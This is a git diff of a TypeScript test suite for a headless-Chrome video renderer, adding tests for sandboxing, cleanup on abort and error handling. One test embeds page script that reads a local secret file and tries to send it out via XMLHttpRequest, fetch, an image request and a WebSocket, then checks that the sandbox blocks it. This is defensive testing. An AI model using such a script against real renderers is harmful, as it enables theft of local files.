@@ -1,6 +1,8 @@
 import assert from 'node:assert/strict';
 import {execFile} from 'node:child_process';
-import {mkdtemp, readFile, readdir, rm} from 'node:fs/promises';
+import {mkdir, mkdtemp, readFile, readdir, rm, writeFile} from 'node:fs/promises';
+import {createServer} from 'node:http';
+import type {AddressInfo} from 'node:net';
 import {tmpdir} from 'node:os';
 import {join} from 'node:path';
 import {setTimeout as sleep} from 'node:timers/promises';
@@ -8,15 +10,16 @@ import {describe, it} from 'node:test';
 import {
 	buildMotionFfmpegArgs,
 	cdpRequest,
-	chromeMotionArgs,
 	frameCount,
 	frameFileName,
 	motionEngine,
 	parseCdpMessage,
 } from '../src/engines/motion.ts';
 import type {MotionInput} from '../src/engines/motion.ts';
+import {chromeArgs} from '../src/engines/chrome-session.ts';
 import {execFileExec, isEngineFailure} from '../src/exec.ts';
 import type {EngineRunContext} from '../src/types.ts';
+import {isChromeAlive, leftoverProfiles, withIsolatedTmp} from './render-helpers.ts';
 
 const availability = await motionEngine.available({
 	exec: execFileExec,
@@ -274,26 +277,39 @@ describe('motion pure helpers', () => {
 		assert.equal(frameFileName(7), '00007.png');
 	});
 
-	it('launches Chrome headless with an ephemeral DevTools port', () => {
-		assert.deepEqual(chromeMotionArgs({profileDir: '/p', width: 320, height: 240}), [
+	it('launches Chrome over a DevTools pipe behind a closed proxy, with no file access', () => {
+		const args = chromeArgs({
+			profileDir: '/p',
+			width: 320,
+			height: 240,
+			sandboxHost: '127.0.0.1:5555',
+		});
+		assert.deepEqual(args, [
 			'--headless=new',
 			'--disable-gpu',
 			'--hide-scrollbars',
+			'--mute-audio',
 			'--no-first-run',
 			'--no-default-browser-check',
-			'--allow-file-access-from-files',
-			'--mute-audio',
+			'--disable-background-networking',
+			'--disable-component-update',
+			'--remote-debugging-pipe',
 			'--user-data-dir=/p',
-			'--remote-debugging-port=0',
 			'--window-size=320,240',
+			'--proxy-server=127.0.0.1:9',
+			'--proxy-bypass-list=<-loopback>;127.0.0.1:5555',
+			'--force-webrtc-ip-handling-policy=disable_non_proxied_udp',
 			'about:blank',
 		]);
+		assert.equal(
+			args.some(arg => arg.includes('allow-file-access') || arg.includes('remote-debugging-port')),
+			false,
+		);
 	});
 
 	it('encodes frames alone without a filter graph', () => {
 		assert.deepEqual(
 			buildMotionFfmpegArgs(inputOf({durationS: 4, fps: 30}), {
-				framesDir: '/o/frames',
 				outPath: '/o/motion.mp4',
 			}),
 			[
@@ -305,7 +321,7 @@ describe('motion pure helpers', () => {
 				'-framerate',
 				'30',
 				'-i',
-				'/o/frames/%05d.png',
+				'%05d.png',
 				'-map',
 				'0:v',
 				'-c:v',
@@ -328,9 +344,9 @@ describe('motion pure helpers', () => {
 	it('mixes voiceover and music after the frame input', () => {
 		const args = buildMotionFfmpegArgs(
 			inputOf({durationS: 2, voiceover: '/a/v.wav', music: '/a/m.wav', musicVolume: 0.3}),
-			{framesDir: '/o/frames', outPath: '/o/motion.mp4'},
+			{outPath: '/o/motion.mp4'},
 		);
-		assert.deepEqual(args.slice(8, 13), ['/o/frames/%05d.png', '-i', '/a/v.wav', '-i', '/a/m.wav']);
+		assert.deepEqual(args.slice(8, 13), ['%05d.png', '-i', '/a/v.wav', '-i', '/a/m.wav']);
 		const graph = args[args.indexOf('-filter_complex') + 1] ?? '';
 		assert.equal(
 			graph,
@@ -485,39 +501,150 @@ describe('motion engine', live, () => {
 		});
 	});
 
-	it('kills Chrome and its helpers when the run is aborted', async () => {
-		await withTempDir(async dir => {
-			const controller = new AbortController();
-			const profile = join(dir, '.chrome-motion');
-			const running = motionEngine.run({
-				input: inputOf({html: REDDEN_TO_BLUE, durationS: 30, fps: 30}),
-				ctx: contextFor(dir, {signal: controller.signal}),
-			});
-			const settled = running.then(
-				() => 'finished',
-				() => 'rejected',
-			);
-			const isAlive = (): Promise<boolean> =>
-				run('pgrep', ['-f', profile]).then(
-					() => true,
-					() => false,
+	it('kills Chrome and its helpers when the run is aborted, and removes its profile', async () => {
+		await withIsolatedTmp(async root => {
+			await withTempDir(async dir => {
+				const controller = new AbortController();
+				const running = motionEngine.run({
+					input: inputOf({html: REDDEN_TO_BLUE, durationS: 30, fps: 30}),
+					ctx: contextFor(dir, {signal: controller.signal}),
+				});
+				const settled = running.then(
+					() => 'finished',
+					() => 'rejected',
 				);
-			let up = false;
-			for (let tries = 0; tries < 100 && !up; tries += 1) {
-				up = await isAlive();
-				if (!up) await sleep(100);
-			}
-			assert.equal(up, true, 'Chrome should be running with the profile path');
-			let framesWritten = 0;
-			for (let tries = 0; tries < 200 && framesWritten < 3; tries += 1) {
-				framesWritten = (await readdir(join(dir, 'frames')).catch(() => [])).length;
-				if (framesWritten < 3) await sleep(50);
-			}
-			assert.ok(framesWritten >= 3, 'the abort should land mid-render');
-			controller.abort();
-			assert.equal(await settled, 'rejected');
-			assert.equal(await isAlive(), false);
-			assert.deepEqual(await readdir(dir), ['source.html']);
+				let up = false;
+				for (let tries = 0; tries < 100 && !up; tries += 1) {
+					up = await isChromeAlive(root);
+					if (!up) await sleep(100);
+				}
+				assert.equal(up, true, 'Chrome should be running with its profile under the temp root');
+				let framesWritten = 0;
+				for (let tries = 0; tries < 200 && framesWritten < 3; tries += 1) {
+					framesWritten = (await readdir(join(dir, 'frames')).catch(() => [])).length;
+					if (framesWritten < 3) await sleep(50);
+				}
+				assert.ok(framesWritten >= 3, 'the abort should land mid-render');
+				controller.abort();
+				assert.equal(await settled, 'rejected');
+				assert.equal(await isChromeAlive(root), false);
+				assert.deepEqual(await readdir(dir), ['source.html']);
+				assert.deepEqual(await leftoverProfiles(root), []);
+			});
+		});
+	});
+
+	it('keeps its Chrome profile out of the job folder', async () => {
+		await withIsolatedTmp(async root => {
+			await withTempDir(async dir => {
+				const controller = new AbortController();
+				const running = motionEngine.run({
+					input: inputOf({html: REDDEN_TO_BLUE, durationS: 30, fps: 30}),
+					ctx: contextFor(dir, {signal: controller.signal}),
+				});
+				const settled = running.then(
+					() => 'finished',
+					() => 'rejected',
+				);
+				let profiles: readonly string[] = [];
+				for (let tries = 0; tries < 100 && profiles.length === 0; tries += 1) {
+					profiles = await leftoverProfiles(root);
+					if (profiles.length === 0) await sleep(50);
+				}
+				assert.equal(profiles.length, 1);
+				assert.deepEqual(
+					(await readdir(dir)).filter(name => name.startsWith('.chrome')),
+					[],
+				);
+				controller.abort();
+				await settled;
+			});
+		});
+	});
+
+	it('rejects, without crashing or orphaning Chrome, when a frame cannot be written', async () => {
+		const unhandled: unknown[] = [];
+		const record = (reason: unknown): void => {
+			unhandled.push(reason);
+		};
+		process.on('unhandledRejection', record);
+		try {
+			await withIsolatedTmp(async root => {
+				await withTempDir(async dir => {
+					const running = motionEngine.run({
+						input: inputOf({html: REDDEN_TO_BLUE, durationS: 30, fps: 30}),
+						ctx: contextFor(dir),
+					});
+					const settled = running.then(
+						() => undefined,
+						(error: unknown) => error,
+					);
+					let framesWritten = 0;
+					for (let tries = 0; tries < 400 && framesWritten < 2; tries += 1) {
+						framesWritten = (await readdir(join(dir, 'frames')).catch(() => [])).length;
+						if (framesWritten < 2) await sleep(25);
+					}
+					assert.ok(framesWritten >= 2, 'frames should be flowing before the folder vanishes');
+					await rm(join(dir, 'frames'), {recursive: true, force: true});
+					const error = await settled;
+					assert.equal(isEngineFailure(error), true);
+					assert.equal((error as {code: string}).code, 'render_failed');
+					assert.equal((error as {retryable: boolean}).retryable, true);
+					await sleep(300);
+					assert.equal(await isChromeAlive(root), false);
+					assert.deepEqual(await leftoverProfiles(root), []);
+				});
+			});
+		} finally {
+			process.off('unhandledRejection', record);
+		}
+		assert.deepEqual(unhandled, []);
+	});
+
+	it('renders when the project path contains percent signs', async () => {
+		await withTempDir(async base => {
+			const project = join(base, '100% x%05dy %d');
+			const outDir = join(project, 'out');
+			await mkdir(outDir, {recursive: true});
+			const outputs = await motionEngine.run({
+				input: inputOf({html: REDDEN_TO_BLUE}),
+				ctx: contextFor(outDir, {cwd: project}),
+			});
+			assert.equal(outputs[0]?.path, join(outDir, 'motion.mp4'));
+			const info = await probe(join(outDir, 'motion.mp4'));
+			assert.equal(info.streams.find(s => s.codec_type === 'video')?.width, 320);
+			assert.ok(Math.abs(Number(info.format.duration) - 1) < 0.12, info.format.duration);
+		});
+	});
+
+	it('cannot read files or reach the network from the page', async () => {
+		await withTempDir(async dir => {
+			const secret = join(dir, 'secret.txt');
+			await writeFile(secret, 'TOP-SECRET-MOTION');
+			const hits: string[] = [];
+			const listener = createServer((request, response) => {
+				hits.push(decodeURIComponent(request.url ?? ''));
+				response.writeHead(200, {'Access-Control-Allow-Origin': '*'});
+				response.end('ok');
+			});
+			await new Promise<void>(resolve => listener.listen(0, '127.0.0.1', resolve));
+			const port = (listener.address() as AddressInfo).port;
+			const html = `<body style="margin:0;background:#fff"><script>
+var x=new XMLHttpRequest();x.open('GET','file://${secret}',false);
+try{x.send();new Image().src='http://127.0.0.1:${port}/leak?d='+encodeURIComponent(x.responseText)}catch(e){}
+fetch('http://127.0.0.1:${port}/fetch?d=1',{mode:'no-cors'}).catch(function(){});
+new Image().src='http://127.0.0.1:${port}/img';
+new WebSocket('ws://127.0.0.1:${port}/ws');
+</script></body>`;
+			const outDir = join(dir, 'job');
+			await mkdir(outDir);
+			await motionEngine.run({
+				input: inputOf({html, durationS: 1.5, fps: 10}),
+				ctx: contextFor(outDir),
+			});
+			await sleep(500);
+			listener.close();
+			assert.deepEqual(hits, []);
 		});
 	});
 });
